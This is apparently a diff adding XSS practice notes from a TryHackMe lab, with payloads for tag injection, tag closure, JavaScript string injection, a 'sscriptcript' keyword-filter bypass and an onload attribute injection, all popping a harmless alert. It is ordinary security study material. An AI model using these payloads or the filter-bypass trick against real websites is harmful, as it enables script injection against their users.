@@ -205,3 +205,75 @@ Blind XSS is a type of stored XSS where the attacker does not see the immediate 
 
 https://github.com/mandatoryprogrammer/xsshunter-express - a tool for detecting and exploiting XSS vulnerabilities.
 
+## XSS Practical Examples
+### Tag injection
+The payload: 
+```html 
+<script>alert('THM');</script> 
+```
+
+<img src="./images/practical-examples/tag-injection/tag-injection-1.png" alt="Tag injection 1" />
+
+<img src="./images/practical-examples/tag-injection/tag-injection-2.png" alt="Tag injection 2" />
+
+<img src="./images/practical-examples/tag-injection/tag-injection-3.png" alt="Tag injection 3" />
+
+### Tag closure
+### EXAMPLE 1
+
+The payload: 
+```html
+"><script>alert('THM');</script>
+```
+
+<img src="./images/practical-examples/tag-closure/tag-closure-1-1.png" alt="Tag closure 1-1" />
+
+<img src="./images/practical-examples/tag-closure/tag-closure-1-2.png" alt="Tag closure 1-2" />
+
+<img src="./images/practical-examples/tag-closure/tag-closure-1-3.png" alt="Tag closure 3" />
+
+### EXAMPLE 2
+The payload: 
+```html
+</textarea><script>alert('THM');</script>
+```
+
+<img src="./images/practical-examples/tag-closure/tag-closure-1-1.png" alt="Tag closure 1-1" />
+
+<img src="./images/practical-examples/tag-closure/tag-closure-1-2.png" alt="Tag closure 1-2" />
+
+<img src="./images/practical-examples/tag-closure/tag-closure-1-3.png" alt="Tag closure 3" />
+
+### Code injection
+The payload: 
+```js
+ ';alert('THM');//
+```
+
+Take note of the comment and the end, making it ignore the rest of the code after our injection in this line.
+
+<img src="./images/practical-examples/code-injection/code-injection-1.png" alt="Code injection 1" />
+
+<img src="./images/practical-examples/code-injection/code-injection-2.png" alt="Code injection 2" />
+
+### Filter bypass
+Initial payload: 
+```html
+<script>alert('THM');</script>
+```
+
+But there is a filter for the word "script", so we can try to bypass it with:
+```html
+<sscriptcript>alert('THM');</sscriptcript>
+```
+
+And it works, as only the middle part "script" is being filtered, leaving the surrounding letters intact.
+
+### Attribute injection
+We have an empty img tag, which is awaiting an input that gets put into the src attribute. However, it gets input directly as HTML, so we can try to inject another attribute to run a JS payload.
+```html
+/images/cat.jpg" onload="alert('THM');
+```
+
+<img src="./images/practical-examples/attribute-injection/attribute-injection-1.png" alt="Attribute injection 1" />
+
